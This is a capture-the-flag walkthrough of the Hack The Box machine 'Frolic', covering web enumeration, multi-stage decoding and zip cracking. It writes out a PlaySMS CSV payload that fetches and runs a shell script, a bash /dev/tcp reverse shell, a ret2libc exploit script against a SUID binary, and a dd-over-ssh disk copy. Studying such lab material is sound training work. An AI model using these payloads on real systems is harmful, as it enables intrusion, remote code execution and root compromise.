# Frolic
```
Difficulty: Easy
Operating System: Linux
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | (Local) | Web Enumeration & Client-Side Exploit | Found a web server on port 9999 and a directory `/admin`. The login was protected by a simple client-side JavaScript check. The hardcoded credentials were `admin:superduperlooperpassword_lol`, which granted access to a new page. |
| 2 | (Local) | Multi-Stage Decoding & Directory Traversal | The next page contained an Ook-encoded message. Decoding it revealed a new directory `/asdiSIAJJ0QWE9JAS`. This directory held a Base64-encoded zip file. After decoding, the zip was cracked with the password "password" to reveal a file containing hex, which decoded to Brainfuck. The final message was the password `idkwhatispass`. |
| 3 | www-data | Authenticated RCE (User Flag) | Found a web login page for `playsms` at `/dev/backup/playsms`. Used the password `idkwhatispass` to log in as `admin`. Exploited a known vulnerability in PlaySMS (e.g., authenticated RCE via `import.php` or `sendfromfile.php`) by uploading a malicious `.csv` file containing a PHP reverse shell, gaining a shell as the `www-data` user. |
| 4 | root | Buffer Overflow & ROP Chain (Root Flag) | Discovered a SUID binary named `rop` in `/home/ayush/.binary`. Confirmed it was a 32-bit binary with a stack buffer overflow vulnerability, and that ASLR was disabled on the system. Crafted a ROP chain using `libc` addresses for `system`, `exit`, and the string `/bin/sh` to execute a shell. The ROP chain was injected into the vulnerable program, granting a root shell. |

## Initial Enumeration
Running nmap scan (TCP) on the target shows the following
```
Nmap scan report for 10.10.10.111
Host is up (0.077s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)
|   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)
|_  256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
9999/tcp open  http        nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Welcome to nginx!
Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h49m59s, deviation: 3h10m30s, median: 0s
|_nbstat: NetBIOS name: FROLIC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-12-01T09:03:18
|_  start_date: N/A
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: frolic
|   NetBIOS computer name: FROLIC\x00
|   Domain name: \x00
|   FQDN: frolic
|_  System time: 2021-12-01T14:33:17+05:30
```
Let's start by digging into port 9999 here we can find a "Welcome to nginx page" and a reference to an unknown port running on this box (```http://forlic.htb:1880 ```).  
Now, looking into port 1880 we found a node red login. Let's keep this this in mind in case we find credentials in the future.  
Let's dig deeper into port 9999 and run a few directory enumeration scans.  
Below we can see the gobuster's results:
```
/admin                (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/admin/]
/test                 (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/test/]
/dev                  (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/dev/]
/backup               (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/backup/]
/loop                 (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/loop/]
```
Let's check each directory and start a recursive gobuster scan.  
If we hit /admin, we can see a login page stating: *c'mon i m hackable*.  
If we try to analyze the login form we can see that after hitting the submit button no request is performed.  
Giving this fact, we can now analyze the source code, because the function that executes the login is clearly executed at client side.  
Analyzing ```http://10.10.10.111:9999/admin/js/login.js``` we can find the following:
```
if ( username == "admin" && password == "superduperlooperpassword_lol"){
alert ("Login successfully");
window.location = "success.html"; // Redirecting to other page.
return false;
}
```
now we can provide the password to the form or either hit success.html directly.  
success.html contains the following code:
```
..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... ..... ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... ..... ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! ..... ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... ..... ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?. ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!! !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?! .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?.. !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!! !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. ..... ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!! !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! ..... ..!.! !!!!! !.?.
```
If we google this string we can find that this is encoded in ook programming language.  
This can also be identified by using [this tool](https://www.dcode.fr/cipher-identifier)
Just for reference, Ook is a rewriting of the BrainFuck, an already obfuscated esoteric programming language, designed to be writable and readable by orang-utans (which would communicate by pronouncing the onomatopoeia 'ook, ook').  
if we decode the above string we do get:  
```
Nothing here check /asdiSIAJJ0QWE9JAS
```
So let's check this directory.  
Here we do get the following string.
```
UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwABBAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbsK1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmveEMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTjlurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkCAAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBPAAAAAwEAAAAA==
```
This string is clearly encoded in base64, so let's decode it.
```
cat asdiSIAJJ0QWE9JAS | base64 -d > asdiSIAJJ0QWE9JAS.decoded
```
Now if we see the output of this we can see a lot of gibberish things. This is because the output of this is a file.  
If we want to check the file type, we can now run a file command against the decoded string:
```
[root@kali admin-dir ]$ file asdiSIAJJ0QWE9JAS.decoded   
asdiSIAJJ0QWE9JAS.decoded: Zip archive data, at least v2.0 to extract
```
If we now try to unzip the file we get prompted for the password.  
Without further doing, we can now try tro crack the zip password.  
Let's convert the zip hash into jon's readable format
```
zip2john asdiSIAJJ0QWE9JAS.decoded > asdiSIAJJ0QWE9JAS.hash
```
now we can crack the hash by using:
```
john --wordlist=/usr/share/wordlists/rockyou.txt asdiSIAJJ0QWE9JAS.hash
```
So, running:
```
[root@kali admin-dir ]$ john --show asdiSIAJJ0QWE9JAS.hash                                      
asdiSIAJJ0QWE9JAS.decoded/index.php:password:index.php:asdiSIAJJ0QWE9JAS.decoded::asdiSIAJJ0QWE9JAS.decoded
```
we can see the password: ```password``` for the zip, so now we can unzip it.  
Here we can find other bunch of encoded data:
```
4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a
```
This time it seems to be encoded in hex characters. So let's try to decode it.  
```
[root@kali zip-out ]$ cat index.php | xxd -r -p
KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr
KysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysg
K1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0t
LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg==
```
now, still, encoded in base64. Let's decode...
```
[root@kali zip-out ]$ cat index.php.hex.decoded | base64 -d            
+++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
<]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
++..<
```
We still do get a bunch of encoded data, now we need to identify the encoding language and decode.
This seems to be brainfuck.  
Just for reference, brainfuck Brainfuck is an esoteric programming language created in 1993 by Urban Müller.  
Notable for its extreme minimalism, the language consists of only eight simple commands, a data pointer and an instruction pointer.  
While it is fully Turing complete, it is not intended for practical use, but to challenge and amuse programmers. Brainfuck simply requires one to break commands into microscopic steps.  
Now, let's decode:
```
idkwhatispass
```
Seems like we got a password and went to the bottom of this challenge. Now, let's try to other directories initially found with gobuster.  
If we dig into /dev, we can find:
```
/test                 (Status: 200) [Size: 5]
/backup               (Status: 301) [Size: 194] [--> http://10.10.10.111:9999/dev/backup/]
```
if we open /dev/backup, we can find a reference to a new path "/playsms"

## User
Once we fond the /playsms login page we can login using "admin" and "idkwhatispass".  
Now we are logged in as admin to playsms.
Now the obvious thing to do is to enumerate the version and search for publicly available exploits.  
Since we cannot enumerate the version, we can choose the exploit and go blindfolded.
```
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
PlaySms 0.7 - SQL Injection                                                                                                                                                                                | linux/remote/404.pl
PlaySms 0.8 - 'index.php' Cross-Site Scripting                                                                                                                                                             | php/webapps/26871.txt
PlaySms 0.9.3 - Multiple Local/Remote File Inclusions                                                                                                                                                      | php/webapps/7687.txt
PlaySms 0.9.5.2 - Remote File Inclusion                                                                                                                                                                    | php/webapps/17792.txt
PlaySms 0.9.9.2 - Cross-Site Request Forgery                                                                                                                                                               | php/webapps/30177.txt
PlaySMS 1.4.3 - Template Injection / Remote Code Execution                                                                                                                                                 | php/webapps/48199.txt
PlaySMS 1.4 - 'import.php' Remote Code Execution                                                                                                                                                           | php/webapps/42044.txt
PlaySMS 1.4 - Remote Code Execution                                                                                                                                                                        | php/webapps/42038.txt
PlaySMS 1.4 - 'sendfromfile.php?Filename' (Authenticated) 'Code Execution (Metasploit)                                                                                                                     | php/remote/44599.rb
PlaySMS 1.4 - '/sendfromfile.php' Remote Code Execution / Unrestricted File Upload                                                                                                                         | php/webapps/42003.txt
PlaySMS - 'import.php' (Authenticated) CSV File Upload Code Execution (Metasploit)                                                                                                                         | php/remote/44598.rb
PlaySMS - index.php Unauthenticated Template Injection Code Execution (Metasploit)                                                                                                                         | php/remote/48335.rb
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
Now, after reading few exploits, we decided to choose ```php/webapps/42044.txt``` as is seems to be the easier to exploit.
All we have to do is create the following .csv payload:
```
"Name","Mobile","Email","Group code","Tags"
"<?php system('curl 10.10.14.4/shell.sh | bash'); ?> ","432674585747","","",""
```
create a shell.sh file
```
bash -c 'bash -i >& /dev/tcp/10.10.14.4/1234 0>&1'
```
and import the .csv payload by navigating to My Account -> Phonebook -> Import.  
Now we run the import and get a shell as www-data
```
root@kali:~/Documents/HTB/Boxes/Frolic# nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.111] 38224
bash: cannot set terminal process group (1210): Inappropriate ioctl for device
bash: no job control in this shell
www-data@frolic:~/html/playsms$
```

## Root
Now that we have access as www-data, we can run linpeas.sh and enumerate the box for possible PE vectors.  
if we go through the output we see the following:
```
════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════                                                                                                                                                
╔══════════╣ SUID - Check easy privesc, exploits and write perms                                                                                                                                                                             
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                                                                                                  
-rwsr-xr-x 1 root root 38K Mar  6  2017 /sbin/mount.cifs                                                              
-rwsr-xr-x 1 root root 34K Dec  1  2017 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 43K May  8  2014 /bin/ping6                                                                                                                                                                                           
-rwsr-xr-x 1 root root 30K Jul 12  2016 /bin/fusermount                                                                                                                                                                                      
-rwsr-xr-x 1 root root 39K May  8  2014 /bin/ping                                                                                                                                                                                            
-rwsr-xr-x 1 root root 26K Dec  1  2017 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 38K May 17  2017 /bin/su                                                                       
-rwsr-xr-x 1 root root 154K Jan 28  2017 /bin/ntfs-3g  --->  Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)
-rwsr-xr-x 1 root root 7.4K Sep 25  2018 /home/ayush/.binary/rop (Unknown SUID binary)  
```
As we can see, there is a suspicious executable called rop.  
This is not marked as being a 95% PE vector, but, considering the location and the file name we can examine it.  
So, let's download the executable and run it in gdb.
First thing first we can check the security configurations of the binary and of the system:
```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
Now we can check in the system if ASLR is enabled or not:
```
www-data@frolic:~/html/playsms$ cat /proc/sys/kernel/randomize_va_space
0
```
Now,after these preliminary checks, we need to create a De Bruijn sequence using pattern create, give the input to rop and see if we get SIGSEGV.  
```
gdb-peda$ pattern_create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
Starting program: /root/Documents/HTB/Boxes/Frolic/rop/rop 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
Download failed: Function not implemented.  Continuing without debug info for /lib/ld-linux.so.2.
Download failed: Function not implemented.  Continuing without debug info for /root/Documents/HTB/Boxes/Frolic/rop/system-supplied DSO at 0xf7fcf000.
Download failed: Function not implemented.  Continuing without debug info for /lib32/libc.so.6.

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x66 ('f')
EBX: 0xffffcf80 --> 0x2
ECX: 0xf7fa8000 --> 0x1e9d6c
EDX: 0x0
ESI: 0xf7fa8000 --> 0x1e9d6c
EDI: 0xf7fa8000 --> 0x1e9d6c
EBP: 0x31414162 ('bAA1')
ESP: 0xffffcf50 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EIP: 0x41474141 ('AAGA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41474141
[------------------------------------stack-------------------------------------]
0000| 0xffffcf50 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0004| 0xffffcf54 ("2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0008| 0xffffcf58 ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0012| 0xffffcf5c ("A3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0016| 0xffffcf60 ("IAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0020| 0xffffcf64 ("AA4AAJAAfAA5AAKAAgAA6AAL")
0024| 0xffffcf68 ("AJAAfAA5AAKAAgAA6AAL")
0028| 0xffffcf6c ("fAA5AAKAAgAA6AAL")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41474141 in ?? ()
```
As we can see, using a pattern of 100 chars, we do get SIGSEGV at 0x41474141.  
Now we can calculate the offset and see how many characters of padding we need to use before putting our rop payload.  
```
gdb-peda$ pattern_offset 0x41474141
1095188801 found at offset: 52
```
So we'll need to put 52 chars before our payload.  
Now let's exploit the stack, we will need 3 things:
* libc address (where is it loaded)
* libc system address
* libc exit address
* /bin/bash string
so that we can execute something like system(/bin/bash).  
Now let's dig for this information.  
To retrive such informations we need to do the following:  
To retrive libc address we can use ```ldd```. ldd prints the shared objects (shared libraries) required by each program or shared object specified on the command line.
```
www-data@frolic:/home/ayush/.binary$ ldd rop       
        linux-gate.so.1 =>  (0xb7fda000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)
        /lib/ld-linux.so.2 (0xb7fdb000)
```
So, here we can see that libc is loaded at 0xb7e19000. Now, let's keep a note and gather all the informations.  
Now we need libc system address and exit offsets from libs base address.  
To get such informations we need to use ```readelf```.  
readelf displays information about one or more ELF format object files.  The options control what particular information to display.  
If we use readelf with the -s flag we can see the entries in symbol table section of the file, if it has one.  
For reference, the symbol table it's a table that contains symbol's name and its location or address.  
without further doing, let's read the libc symbol table for system and exit.
```
www-data@frolic:~/html/playsms$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -i system
   245: 00112f20    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
   627: 0003ada0    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
www-data@frolic:~/html/playsms$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -i exit
   112: 0002edc0    39 FUNC    GLOBAL DEFAULT   13 __cxa_at_quick_exit@@GLIBC_2.10
   141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
   450: 0002edf0   197 FUNC    GLOBAL DEFAULT   13 __cxa_thread_atexit_impl@@GLIBC_2.18
   558: 000b07c8    24 FUNC    GLOBAL DEFAULT   13 _exit@@GLIBC_2.0
   616: 00115fa0    56 FUNC    GLOBAL DEFAULT   13 svc_exit@@GLIBC_2.0
   652: 0002eda0    31 FUNC    GLOBAL DEFAULT   13 quick_exit@@GLIBC_2.10
   876: 0002ebf0    85 FUNC    GLOBAL DEFAULT   13 __cxa_atexit@@GLIBC_2.1.3
  1046: 0011fb80    52 FUNC    GLOBAL DEFAULT   13 atexit@GLIBC_2.0
  1394: 001b2204     4 OBJECT  GLOBAL DEFAULT   33 argp_err_exit_status@@GLIBC_2.1
  1506: 000f3870    58 FUNC    GLOBAL DEFAULT   13 pthread_exit@@GLIBC_2.0
  1849: 000b07c8    24 FUNC    WEAK   DEFAULT   13 _Exit@@GLIBC_2.1.1
  2108: 001b2154     4 OBJECT  GLOBAL DEFAULT   33 obstack_exit_failure@@GLIBC_2.0
  2263: 0002e9f0    78 FUNC    WEAK   DEFAULT   13 on_exit@@GLIBC_2.0
  2406: 000f4c80     2 FUNC    GLOBAL DEFAULT   13 __cyg_profile_func_exit@@GLIBC_2.2
```
The lines we want are these two:
```
  1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
   141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
```
Let's note the offset and grab the next missing piece of the puzzle.  
Now we need to grab /bin/sh string, to do so we can use ```strings``` command.  
strings with -atx flags can a (scan for the whole file) t (radix print the offset within the file before each string) x (print the offset in hex).
```
www-data@frolic:~/html/playsms$ strings -atx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
 15ba0b /bin/sh
```
Now that we have all the needed information, we can craft our exploit:
```
import struct

padding = "A"*52
libc = 0xb7e19000
system = struct.pack('<I', libc + 0x0003ada0)
exit = struct.pack('<I', libc + 0x0002e9d0)
binsh = struct.pack('<I', libc + 0x0015ba0b)

payload = system + exit + binsh

print padding+payload
```
Now that we crafted our exploit we can run it against the top executable.
```
www-data@frolic:/home/ayush/.binary$ ./rop $(python /dev/shm/exploit.py)
# id
uid=0(root) gid=33(www-data) groups=33(www-data)
```
as we can see we managed to root this box.

## Forensics
### Searching in the Device Block
Since we are Curios, let's try to see if we can find the source core of rop.c to study the content.  
Since when we run the command without any argument, we get this message:
```
root@frolic:/home/ayush/.binary# ./rop
[*] Usage: program <message>
```
We can assume that this text is present in the original source code, lo let's try to find it in the block device /dev/sda1
```
root@frolic:/home/ayush/.binary# grep -a 'Usage: program <message>' -A10 -B10 /dev/sda1
grep: memory exhausted
```
So, it seems like we cannot grep into whole device.  
Let's try the following with strings:
```
root@frolic:/home/ayush/.binary# strings /dev/sda1 | grep 'Usage: program <message>' -A10 -B10
#include <stdio.h>                                                                                
#include <stdlib.h>

int main(int argc, char *argv[])
{                                                                 
    setuid(0);                                                                                          
    if (argc < 2)
    {                                                                                                                 
        printf("[*] Usage: program <message>\n");                                                                     
        return -1;                                                                                                    
    }                                            
    vuln(argv[1]);   
    return 0;                                                                                                         
}
void vuln(char * arg)                                                                                                 
{
    char text[40];                                                                                                    
    strcpy(text, arg);                                                                                                
    printf("[+] Message sent: ");          
    printf(text);
}
```
Running this command we can see a bunch of output and the original source code in the middle.  
Now if we want to compile the source, we'll need the exact arguments for gcc.  
let's search in the user's bash history:
```
root@frolic:/home# grep gcc ayush/.bash_history
gcc -m32 -fno-stack-protector -no-pie -o file rop.c
```
now with this command we can compile the source and get the exact executable.  

### Disk Recovery - Unallocated Space Analysis
Since we now have access as root, there is another method that we can use in order to recover files.  
We can download the whole disk to our local machine using the following command:
```
[root@kali Frolic ]$ ssh $TARGET "dd if=/dev/sda | gzip -1 -" | dd of=frolic.gz
```
this command says: connect to target and dd /dev/sda, pipe it over gzip with fast encryption (-1) and send it over standard output.  
The output of this command will write to our shell output the disk content.  
Now, we can pipe the output to dd and wtite the disk .gz file.  
Once we have downloaded the disk, we can decompress:
```
[root@kali Frolic ]$ gzip -d frolic.gz
```
now we can run:
```
[root@kali Frolic ]$ photorec frolic
```
follow the instructions and see the linux partitions.  
At the step below, we can examine the unallocated files only, as examine the whole disk will take forever.  
```                                                                                                 
 1 * Linux                    0  32 33  1180 221  1   18968576                                                                                                                                                                               


Please choose if all space needs to be analysed:                                                                                                                                                                                             
>[   Free    ] Scan for file from ext2/ext3 unallocated space only                                                                                                                                                                           
 [   Whole   ] Extract files from whole partition  
```
Now, we can choose the destination directory where disk will be recovered and wait for photorec to finish.  
When the recovery is complete we can go to the recovery directory and grep for the following:
```
[root@kali photorec ]$ grep -R '<message>' .
grep: ./recup_dir.2/f13250792.elf: binary file matches
./recup_dir.2/f4776808.php:             $xml .= '<message>' . $message . '</message>' . "\n";
grep: ./recup_dir.2/f13250816.elf: binary file matches
./recup_dir.2/f13250776.c:        printf("[*] Usage: program <message>\n");
./recup_dir.2/f13250784.txt:    .string "[*] Usage: program <message>"
```
as we can see, we do get few matches. The most intresting one is ```./recup_dir.2/f13250776.c```.  
if we cat the file, we can see that we obtain the original source code. (The same code obtained by searching in the device block)
```
[root@kali photorec ]$ cat ./recup_dir.2/f13250776.c          
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
    setuid(0);    

    if (argc < 2)
    {
        printf("[*] Usage: program <message>\n");
        return -1;
    }

    vuln(argv[1]);

    return 0;
}

void vuln(char * arg)
{
    char text[40];
    strcpy(text, arg);

    printf("[+] Message sent: ");
    printf(text);
}
```
